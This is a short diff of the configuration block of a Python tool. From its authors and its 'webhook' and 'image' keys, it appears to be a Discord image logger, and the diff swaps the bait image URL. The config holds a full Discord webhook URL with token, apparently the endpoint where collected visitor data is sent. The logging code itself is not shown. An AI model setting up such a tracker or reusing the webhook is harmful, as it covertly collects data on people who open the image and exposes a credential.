@@ -10,7 +10,7 @@ __author__ = "DeKrypt & electron x sinister"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1544418525135896579/wADJp0v4Ga55SZV6f093V3huUjMS8aIvpOrTjD6VJGcbAgS9-pAz6RzoR0KPb7ly2wXe",
-    "image": "https://cdn.discordapp.com/attachments/1530189912387879123/1530189941097893888/IMG_4918.png?ex=6a98166f&is=6a96c4ef&hm=ab088adaf144cd8b47ca45df70796d99b536926918ef3b1f8c28fa2746198194&",
+    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg",
     "imageArgument": True,
 
     # CUSTOMIZATION #
